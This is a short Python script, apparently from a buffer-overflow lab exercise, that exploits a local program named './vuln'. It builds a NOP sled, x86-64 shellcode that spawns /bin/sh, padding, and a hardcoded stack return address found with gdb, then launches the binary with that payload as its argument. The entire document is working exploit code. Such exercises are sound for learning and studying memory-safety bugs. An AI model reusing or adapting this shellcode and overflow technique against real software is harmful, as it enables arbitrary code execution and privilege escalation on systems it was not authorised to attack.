import subprocess

nop = "\x90" * 452

# actual payload: hex string (asm) to open /bin/sh
shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

junkbytes = "\x90" * 45  # offset to rip (return value/ address)

return_address = "0x7fffffffdcdf"  # address of shellcode, found with gdb
return_address_rev = (return_address[2:].decode("hex"))[::-1]  # little endian --> reverse order

payload_string = nop + shellcode + junkbytes + return_address_rev

# print(payload_string)

subprocess.call(["./vuln", payload_string])